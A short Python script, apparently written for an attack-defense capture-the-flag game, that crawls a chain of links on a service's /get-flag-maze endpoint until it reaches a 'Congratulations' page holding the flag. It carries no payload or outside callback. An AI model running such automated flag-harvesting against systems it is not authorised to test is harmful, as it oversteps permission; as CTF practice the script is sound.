#!/usr/bin/env python3

from utils.exploiter_manager import exploit_manager

# ----------
import requests
from bs4 import BeautifulSoup


@exploit_manager
def exploit(ip:str, port:int):
    base_url = f"http://{ip}:{port}"

    # Service 5
    r = requests.get(f"{base_url}/get-flag-maze")

    while True:
        soup = BeautifulSoup(r.content, 'html.parser')
        page:str = soup.find("a")["href"]
        r = requests.get(base_url + page)
        if "Congratulations" in r.text:
            return r.text


if __name__ == "__main__":
    port = 8081                 # Edit with port of the service to exploit
    exploit(port=port)
